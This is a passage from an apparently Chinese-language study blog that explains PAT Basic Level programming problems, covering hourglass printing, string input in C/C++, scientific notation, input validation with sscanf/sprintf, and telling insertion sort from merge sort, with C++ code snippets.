s2;</span><br><span class="line">        <span class="keyword">if</span> (s2 &gt;= left &amp;&amp; s2 &lt;= right)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span> (s2 &lt; max)&#123;</span><br><span class="line">                max = s2;</span><br><span class="line">                maxName = s1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s2 &gt;min)&#123;</span><br><span class="line">                min = s2;</span><br><span class="line">                minName = s1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; count;</span><br><span class="line">    <span class="keyword">if</span> (count != <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; maxName &lt;&lt; <span class="string">" "</span> &lt;&lt; minName &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="类型三：图形输出"><a href="#类型三：图形输出" class="headerlink" title="类型三：图形输出"></a>类型三：图形输出</h1><table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1027</td>
<td style="text-align:center"><strong>打印沙漏（20 分）</strong></td>
<td style="text-align:center">逻辑，等差数列</td>
</tr>
</tbody>
</table>
<h2 id="1027-打印沙漏-（20-分）"><a href="#1027-打印沙漏-（20-分）" class="headerlink" title="1027 打印沙漏 （20 分）"></a>1027 打印沙漏 （20 分）</h2><p>本题要求你写个程序把给定的符号打印成沙漏的形状。例如给定17个“*”，要求按下列格式打印</p>
<pre><code>*****
 ***
  *
 ***
*****
</code></pre><p>所谓“沙漏形状”，是指每行输出奇数个符号；各行符号中心对齐；相邻两行符号数差2；符号数先从大到小顺序递减到1，再从小到大顺序递增；首尾符号数相等。<br>给定任意N个符号，不一定能正好组成一个沙漏。要求打印出的沙漏能用掉尽可能多的符号。<br><strong>输入格式:</strong><br>输入在一行给出1个正整数 $N(≤1000)$ 和一个符号，中间以空格分隔。<br><strong>输出格式:</strong><br>首先打印出由给定符号组成的最大的沙漏形状，最后在一行中输出剩下没用掉的符号数。<br><strong>输入样例:</strong></p>
<blockquote>
<p>19 *</p>
</blockquote>
<p><strong>输出样例:</strong></p>
<pre><code>*****
 ***
  *
 ***
*****
2
</code></pre><h3 id="关键点-2"><a href="#关键点-2" class="headerlink" title="关键点"></a>关键点</h3><p><strong>1. 首先这道题是一道数学题，需要知道这个是一个等差数列。</strong></p>
<p>$a_n = (2n+1)$<br>$S_n = {1\over 2}n(a_1+a_2)$<br>本题中，先不考虑第一行，从第2行开始，所以为$3+5+7+…(2x+1)$，其中我们设 $x$ 总行数，所以：${S_x} = {x(3+2x+1)\over 2}=x(x+2)$<br>可以通过这个公式得到一个三角打印的最大行数 $x$。</p>
<p><strong>局部代码(设N为总个数)：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x,m,n;<span class="comment">//x:一个三角的层数，不算第一行；m*n数组</span></span><br><span class="line"><span class="keyword">for</span> (x = <span class="number">1</span>; x &lt;= N;x++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> * x*(x + <span class="number">2</span>) + <span class="number">1</span> &gt; N)&#123;</span><br><span class="line">        x--;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到一个倒三角的最大行数后，剩下就是输出问题。</p>
<p><strong>2. 如何输出？</strong></p>
<p> 按照一般思想，二维数组双循环+索引关系也是可以解决的，但是逻辑上是有重复的，而且容易乱。<br> 考虑，另一种关系，每一个循环变量不再是索引，而是<strong>数量关系</strong>，那么这个问题逻辑上就会简化。</p>
<p><strong>局部代码如下</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = x; i &gt;= <span class="number">0</span>;i--)&#123;                <span class="comment">//打印倒三角，包含倒三角最后一行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; x - i;j++)&#123;            <span class="comment">//每一行有行数-i个空格</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" "</span>);                        <span class="comment">//最后一行 行数个 空格</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span> * i + <span class="number">1</span>;j++)&#123;        <span class="comment">//每一行有2 * i + 1个符号（等差数列公式）</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= x;i++)&#123;                <span class="comment">//打印正三角，不含第一行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; x-i;j++)&#123;            <span class="comment">//每一行有x-i个空格</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span> * i + <span class="number">1</span>;j++)&#123;        <span class="comment">//每一行有 2 * i + 1个符号</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="类型四：进制转换"><a href="#类型四：进制转换" class="headerlink" title="类型四：进制转换"></a>类型四：进制转换</h1><p>两种思路：</p>
<ol>
<li>小时分秒，年月日等转换问题，化为最小，再进制转换。</li>
<li>按照逻辑顺序依次比较，直到得到结果。</li>
</ol>
<p><strong>典型题目（不难）</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1022</td>
<td style="text-align:center">D进制的A+B （20 分）</td>
<td style="text-align:center">do{}while()处理</td>
</tr>
<tr>
<td style="text-align:center">B1037</td>
<td style="text-align:center">在霍格沃茨找零钱 （20 分）</td>
<td style="text-align:center">边界检测</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="类型五：字符串处理"><a href="#类型五：字符串处理" class="headerlink" title="类型五：字符串处理"></a>类型五：字符串处理</h1><ul>
<li>对于简单字符操作，可以直接使用<code>scanf(&quot;%c&quot;,&amp;C)</code>逐字读取。</li>
<li>配合<code>while (scanf(&quot;%c&quot;,&amp;C)!= EOF)</code>循环读取字符串，EOF是文件结束标志，在windows平台，一般模拟eof的输入是在一个新行的开头输入<code>ctrl + z</code>就行了；在unix环境下，是在一个新行的开始出输入<code>ctrl + D</code>就可以了。同时要注意，<strong>字符读取会读到<code>\n</code>换行标记符，所以计算长度时应减1。</strong></li>
</ul>
<h2 id="scanf-“-s”-ch-和cin-gt-gt-str比较"><a href="#scanf-“-s”-ch-和cin-gt-gt-str比较" class="headerlink" title="scanf(“%s”,ch)和cin &gt;&gt; str比较"></a>scanf(“%s”,ch)和cin &gt;&gt; str比较</h2><p><strong>相同点：</strong></p>
<ul>
<li>都不读空格，都是读取字符串，遇到空格，回车或者制表符就会结束输入；</li>
<li>其后接<code>fgets(ch,1010,stdin);</code>或<code>getline(cin,s);</code>时，都需要加<code>getchar();</code>读取换行符以进行下一行读取；</li>
<li>读取字符相同。</li>
</ul>
<p><strong>不同点</strong></p>
<ul>
<li><code>scanf</code>读取到<code>char</code>数组，<code>cin</code>读取到<code>string</code>对象；</li>
<li>需要的库不同：<ul>
<li><code>scanf</code>不需要，可能需要对<code>char</code>数组的操作库<code>&lt;cstring&gt;</code></li>
<li><code>cin &gt;&gt; str;</code>需要<code>&lt;iostream&gt;&lt;string&gt;</code></li>
</ul>
</li>
</ul>
<h2 id="fgets-char数组-大小-stdin-和getline-cin-str"><a href="#fgets-char数组-大小-stdin-和getline-cin-str" class="headerlink" title="fgets(char数组,大小,stdin)和getline(cin,str)"></a>fgets(char数组,大小,stdin)和getline(cin,str)</h2><p><strong>相同点：</strong></p>
<ul>
<li>均按行读取，可以按行读取<strong>任何</strong>字符，所以可以读空格。</li>
</ul>
<p><strong>不同点</strong></p>
<ul>
<li><code>fgets</code>读取到<code>char</code>数组的长度比<strong>你预期输入的字符串长度大一</strong>，因为包含了结尾字符<code>\n</code>，这一点和<code>cin.get()</code>一样，都将换行符保留在输入序列中；而<code>getline</code>读取的字符串长度正常。</li>
</ul>
<h2 id="include-lt-ctype-h-gt-库"><a href="#include-lt-ctype-h-gt-库" class="headerlink" title="include &lt;ctype.h&gt;库"></a><code>include &lt;ctype.h&gt;</code>库</h2><p>包含了判断字母数字，大小写转换等函数。</p>
<p><code>isalpha</code>：检查ch是否是字母。<br><code>iscntrl</code>：检查ch是否控制字符(其ASCII码在0和0x1F之间,数值为 0-31)。<br><code>isdigit</code>：检查ch是否是数字(0-9)。<br><code>islower</code>：检查ch是否小写字母(a-z)。<br><code>isupper</code>：检查ch是否是大写字母(A-Z)。<br><code>tolower</code>：将ch字符转换为小写字母。<br><code>toupper</code>：将ch字符转换成大写字母。<br><code>isalnum</code>：检查ch是否是字母或数字。</p>
<h2 id="sscanf-和sprintf-的使用"><a href="#sscanf-和sprintf-的使用" class="headerlink" title="sscanf()和sprintf()的使用"></a><code>sscanf()</code>和<code>sprintf()</code>的使用</h2><p><strong><code>sscanf()</code>和<code>scanf()</code>类比</strong><br><code>sscanf(ch,%d,&amp;n)</code>，类比于<code>scanf()</code>是读取到n，<code>sscanf()</code>也是读取到n，只不过是从字符串数组<code>ch[]</code>读入的。有一些注意：</p>
<ul>
<li><strong>返回值：</strong>如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回 <code>EOF</code>。</li>
</ul>
<p><strong><code>sprintf()</code>和<code>printf()</code>类比</strong><br><code>sprintf(ch,%d,n)</code>，类比于<code>printf()</code>是输出到命令行，<code>sprintf()</code>也是输出，只不过是输出到字符串数组<code>ch[]</code>。有一些注意：</p>
<ul>
<li><strong>返回值：</strong>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</li>
</ul>
<h2 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h2><p>三种读取方式，一般字符串较复杂的情况，<code>getline</code>和<code>fgets</code>和<code>cin</code>方式比较好，相对难用的是<code>while(scanf(&quot;%c&quot;,&amp;c)!=EOF)</code>方法。</p>
<blockquote>
<p><code>fgets</code>面向char数组，<code>cin</code>面向<code>string</code>对象，这两个均有相关函数<code>&lt;cstring&gt;&lt;string&gt;</code>配合操作字符串，而<code>while</code>面向的确实<code>char</code>类型，其对于单个字符处理可能还不错，但如果涉及一些字符串操作，则会显得低效，但仍有一些方法不得不用<code>while</code>。</p>
</blockquote>
<h2 id="较难题目"><a href="#较难题目" class="headerlink" title="较难题目"></a>较难题目</h2><table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1024</td>
<td style="text-align:center"><strong>科学计数法 （20 分）</strong></td>
<td style="text-align:center">逻辑较为复杂，要谨慎</td>
</tr>
<tr>
<td style="text-align:center">B1052</td>
<td style="text-align:center"><strong>卖个萌 （20 分）</strong></td>
<td style="text-align:center">数组越界访问</td>
</tr>
<tr>
<td style="text-align:center">B1054</td>
<td style="text-align:center"><strong>求平均值 （20 分）</strong></td>
<td style="text-align:center">sscanf()和sprintf()</td>
</tr>
</tbody>
</table>
<h2 id="1024-科学计数法-（20-分）"><a href="#1024-科学计数法-（20-分）" class="headerlink" title="1024 科学计数法 （20 分）"></a>1024 科学计数法 （20 分）</h2><p>科学计数法是科学家用来表示很大或很小的数字的一种方便的方法，其满足正则表达式 <code>[+-][1-9].[0-9]+E[+-][0-9]+</code>，即数字的整数部分只有 1 位，小数部分至少有 1 位，该数字及其指数部分的正负号即使对正数也必定明确给出。<br>现以科学计数法的格式给出实数 A，请编写程序按普通数字表示法输出 A，并保证所有有效位都被保留。<br><strong>输入格式：</strong><br>每个输入包含 1 个测试用例，即一个以科学计数法表示的实数 A。该数字的存储长度不超过 9999 字节，且其指数的绝对值不超过 9999。<br><strong>输出格式：</strong><br>对每个测试用例，在一行中按普通数字表示法输出 A，并保证所有有效位都被保留，包括末尾的 0。<br><strong>输入样例 1：</strong></p>
<blockquote>
<p>+1.23400E-03</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>0.00123400</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>-1.2E+10</p>
</blockquote>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>-12000000000</p>
</blockquote>
<h3 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h3><p>正则表达式<code>[+-][1-9].[0-9]+E[+-][0-9]+</code>给出本题关键。<strong>整数部分为（1-9）</strong>限制了0的情况。</p>
<ul>
<li><p>不论是什么样的字符串读取逻辑，其目的都是需要固定的几个数组或数字：</p>
<ul>
<li>实数符号，为’+’号不输出，’-‘号应输出。</li>
<li>实数部分，存入char数组，应不含小数点，因为固定为第一位后为小数点。</li>
<li>指数正负号，存为char，用于后面移位的判断。</li>
<li>指数部分，存为int，后面可直接作为判断边界。</li>
</ul>
</li>
</ul>
<p>分上述a-d四部分读取并存入相应类型中。</p>
<ul>
<li>逻辑部分<ul>
<li>不考虑指数为<code>0</code>（包含+0和-0）情况，因为无意义。</li>
<li>指数为正数时，进位后仍需要小数点，说明指数小于（实数位数-1）（小数点在第一位后，所以要减一），并将小数点放置实数char数组中指数+1位置。</li>
<li>指数为正数时，进位后不需要小数点，说明指数大于等于（实数位数-1），此时，可能需要补零，根据指数大于（实数位数-1）判断。</li>
<li>指数为负数时，一定输出0.xxx…类型，所以先输出<code>0.</code>，再判断是否继续输出0，根据指数-1是否大于0判断，然后输出实数char数组。</li>
</ul>
</li>
</ul>
<p><strong>指数为正 </strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (operE == <span class="string">'+'</span>)&#123;<span class="comment">//指数为正数</span></span><br><span class="line">    <span class="keyword">if</span> (expAbs &lt; lenA - <span class="number">1</span>)&#123; <span class="comment">//需要小数点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lenA; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i == expAbs + <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, A[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//不需要小数点，但是要添0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lenA; i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, A[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; expAbs - lenA + <span class="number">1</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>指数为负</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//指数为负数，不考虑 -0 情况，因为没意义</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0."</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; expAbs - <span class="number">1</span>; j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lenA; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, A[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1052-卖个萌-（20-分）"><a href="#1052-卖个萌-（20-分）" class="headerlink" title="1052 卖个萌 （20 分）"></a>1052 卖个萌 （20 分）</h2><p>萌<br>萌哒表情符号通常由“手”、“眼”、“口”三个主要部分组成。简单起见，我们假设一个表情符号是按下列格式输出的：<br><code>[左手]([左眼][口][右眼])[右手]</code><br>现给出可选用的符号集合，请你按用户的要求输出表情。<br><strong>输入格式：</strong><br>输入首先在前三行顺序对应给出手、眼、口的可选符号集。每个符号括在一对方括号 []内。题目保证每个集合都至少有一个符号，并不超过 10 个符号；每个符号包含 1 到 4 个非空字符。<br>之后一行给出一个正整数 K，为用户请求的个数。随后 K 行，每行给出一个用户的符号选择，顺序为左手、左眼、口、右眼、右手——这里只给出符号在相应集合中的序号（从 1 开始），数字间以空格分隔。<br><strong>输出格式：</strong><br>对每个用户请求，在一行中输出生成的表情。若用户选择的序号不存在，则输出 <code>Are you kidding me? @\/@</code>。<br><strong>输入样例：</strong></p>
<blockquote>
<p><code>[╮][╭][o][~\][/~] [&lt;][&gt;]</code><br><code>[╯][╰][^][-][=][&gt;][&lt;][@][⊙]</code><br><code>[Д][▽][_][ε][^] ...</code><br>4<br>1 1 2 2 2<br>6 8 1 5 5<br>3 3 4 3 3<br>2 10 3 9 3</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p><code>╮(╯▽╰)╭</code><br><code>&lt;(@Д=)/~</code><br><code>o(^ε^)o</code><br><code>Are you kidding me? @\/@</code></p>
</blockquote>
<h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><p>我想正常的按行读取字符串应该不会在逻辑上有问题，仅注意考虑读取<strong>空格</strong>。</p>
<ul>
<li>读入处理，需要根据括号<code>[ ]</code>来获取字符，这个逻辑也不难。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getChars</span><span class="params">(<span class="built_in">string</span> s,<span class="built_in">string</span> strs[<span class="number">11</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = s.length();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len)&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] == <span class="string">'['</span>)&#123;                                <span class="comment">//找到字符 '['</span></span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (s[i] != <span class="string">']'</span>)&#123;</span><br><span class="line">                strs[cnt] += s[i++];                    <span class="comment">//将 [ ]中字符存入hand[cnt]中，其他同理</span></span><br><span class="line">            &#125;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;                                            <span class="comment">//返回表情符号个数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>另一个考察点：<strong>数组越界判断</strong>，需要注意给出的数字既不能大于最长长度，也不能小于1。我没有注意下界导致很长时间过不去，测试数据里有两个测试用例是含有小于1的数字。</p>
</li>
<li><p>最后一个注意的，特殊符号如果想输出在c语言中是双写的。例如：<br><code>printf(&quot;%%\\&quot;); //输出 : %\</code></p>
</li>
</ul>
<hr>
<h2 id="1054-求平均值-（20-分）"><a href="#1054-求平均值-（20-分）" class="headerlink" title="1054 求平均值 （20 分）"></a>1054 求平均值 （20 分）</h2><p>本题的基本要求非常简单：给定N个实数，计算它们的平均值。但复杂的是有些输入数据可能是非法的。一个“合法”的输入是 [−1000,1000] 区间内的实数，并且最多精确到小数点后 2 位。当你计算平均值的时候，不能把那些非法的数据算在内。<br><strong>输入格式：</strong><br>输入第一行给出正整数 $N（≤100）$。随后一行给出 N 个实数，数字间以一个空格分隔。<br><strong>输出格式：</strong><br>对每个非法输入，在一行中输出 <code>ERROR: X is not a legal number</code>，其中 X 是输入。最后在一行中输出结果：<code>The average of K numbers is Y</code>，其中 K 是合法输入的个数，Y 是它们的平均值，精确到小数点后 2 位。如果平均值无法计算，则用 <code>Undefined</code> 替换 Y。如果 K 为 1，则输出 <code>The average of 1 number is Y</code>。<br><strong>输入样例 1：</strong></p>
<blockquote>
<p>7<br>5 -3.2 aaa 9999 2.3.4 7.123 2.35</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>ERROR: aaa is not a legal number<br>ERROR: 9999 is not a legal number<br>ERROR: 2.3.4 is not a legal number<br>ERROR: 7.123 is not a legal number<br>The average of 3 numbers is 1.38</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>2<br>aaa -9999</p>
</blockquote>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>ERROR: aaa is not a legal number<br>ERROR: -9999 is not a legal number<br>The average of 0 numbers is Undefined</p>
</blockquote>
<h3 id="关键点-3"><a href="#关键点-3" class="headerlink" title="关键点"></a>关键点</h3><p>本题主要考查，一个知识点：<code>sscanf()</code>和<code>sprintf()</code>的使用。</p>
<p><code>sprintf(ch,%d,n)</code>，类比于<code>printf()</code>是输出到命令行，<code>sprintf()</code>也是输出，只不过是输出到字符串数组<code>ch[]</code>。有一些注意：</p>
<ul>
<li><strong>返回值：</strong>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</li>
</ul>
<p>这样可以利用这个性质，分别将原始读入的字符串和经过格式转化过的字符串比较，如果不等，则得到数据不合格。</p>
<p><strong>部分代码</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, a);</span><br><span class="line"><span class="keyword">int</span> all = <span class="built_in">sscanf</span>(a, <span class="string">"%lf"</span>, &amp;temp);</span><br><span class="line"><span class="keyword">if</span> (all == <span class="number">0</span>)&#123; <span class="comment">//用于不是数字的判断</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ERROR: %s is not a legal number\n"</span>, a);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(b,<span class="string">"%.2f"</span>,temp);</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;<span class="comment">//数据合法</span></span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (a[j] != b[j])&#123;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>注意：</strong>这里对sscanf加了一个返回判断，因为对于不是数字的读取，实际操作时返回了一个错误，所以在这里直接规避掉。</p>
<hr>
<h1 id="类型六：排序"><a href="#类型六：排序" class="headerlink" title="类型六：排序"></a>类型六：排序</h1><ul>
<li><p>考察<code>&lt;algorithm&gt;</code>库中<code>sort()</code>的使用。</p>
</li>
<li><p><strong><code>unordered_map</code>效率优于<code>map</code></strong></p>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1055</td>
<td style="text-align:center"><strong>集体照 （25 分）</strong></td>
<td style="text-align:center">左右交替==循环加2</td>
</tr>
<tr>
<td style="text-align:center">B1095</td>
<td style="text-align:center"><strong>解码PAT准考证 （25 分）</strong></td>
<td style="text-align:center">有时候后处理数据会简化逻辑</td>
</tr>
<tr>
<td style="text-align:center">B1035</td>
<td style="text-align:center"><strong>插入与归并 （25 分））</strong></td>
<td style="text-align:center"><strong>插入排序和归并排序</strong></td>
</tr>
</tbody>
</table>
<h2 id="1035-插入与归并-（25-分）"><a href="#1035-插入与归并-（25-分）" class="headerlink" title="1035 插入与归并 （25 分）"></a>1035 插入与归并 （25 分）</h2><p>根据维基百科的定义：<br><strong>插入排序</strong>是迭代算法，逐一获得输入数据，逐步产生有序的输出序列。每步迭代中，算法从输入序列中取出一元素，将之插入有序序列中正确的位置。如此迭代直到全部元素有序。<br><strong>归并排序</strong>进行如下迭代操作：首先将原始序列看成 N 个只包含 1 个元素的有序子序列，然后每次迭代归并两个相邻的有序子序列，直到最后只剩下 1 个有序的序列。<br>现给定原始序列和由某排序算法产生的中间序列，请你判断该算法究竟是哪种排序算法？<br><strong>输入格式：</strong><br>输入在第一行给出正整数 N (≤100)；随后一行给出原始序列的 N 个整数；最后一行给出由某排序算法产生的中间序列。这里假设排序的目标序列是升序。数字间以空格分隔。<br><strong>输出格式：</strong><br>首先在第 1 行中输出<code>Insertion Sort</code>表示插入排序、或<code>Merge Sort</code>表示归并排序；然后在第 2 行中输出用该排序算法再迭代一轮的结果序列。题目保证每组测试的结果是唯一的。数字间以空格分隔，且行首尾不得有多余空格。<br><strong>输入样例 1：</strong></p>
<blockquote>
<p>10<br>3 1 2 8 7 5 9 4 6 0<br>1 2 3 7 8 5 9 4 6 0</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>Insertion Sort<br>1 2 3 5 7 8 9 4 6 0</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>10<br>3 1 2 8 7 5 9 4 0 6<br>1 3 2 8 5 7 4 9 0 6</p>
</blockquote>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>Merge Sort<br>1 2 3 8 4 5 7 9 0 6</p>
</blockquote>
<h3 id="关键点-4"><a href="#关键点-4" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li>因为只有两种情况，那么根据从简单的情况入手。插入排序的判断比较容易，插入排序具有：<strong>前面有序，而后面和排序前一样的特点。</strong></li>
</ul>
<p><strong>部分实现</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (k &lt; N<span class="number">-1</span> &amp;&amp; b[k - <span class="number">1</span>] &lt;= b[k]) k++;</span><br><span class="line"><span class="keyword">int</span> len = k;</span><br><span class="line"><span class="keyword">while</span> (k &lt; N)&#123;</span><br><span class="line">    <span class="keyword">if</span> (a[k] != b[k]) <span class="keyword">break</span>;</span><br><span class="line">    k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (k == N)&#123; <span class="comment">//根据是否按照到达结尾判断插入排序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Insertion Sort\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>归并排序的下一轮排序，需要直到上一轮排序的步长。如何得到步长，提供一个资料：<br><href><a href="https://www.bilibili.com/video/av10948002/?p=141" target="_blank" rel="noopener">https://www.bilibili.com/video/av10948002/?p=141</a></href>，利用了本题的一个特点，归并排序下最小步长为2，如果步长为1，那么也即是原数列，会出现一种：</p>
<blockquote>
<p>10<br>3 1 2 8 7 5 9 4 0 6<br>3 1 2 8 7 5 9 4 0 6</p>
</blockquote>
<p>那么就没办法判断是归并还是插入。所以，归并的步长从2开始找就可以了。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getStep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (; l*<span class="number">2</span> &lt; N; l *= <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = l; j+<span class="number">2</span>*l &lt; N; j += <span class="number">2</span> * l)&#123;</span><br><span class="line">            <span class="keyword">if</span> (b[j - <span class="number">1</span>] &gt; b[j]) <span class="keyword">return</span> l;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>完整代码</strong></p>
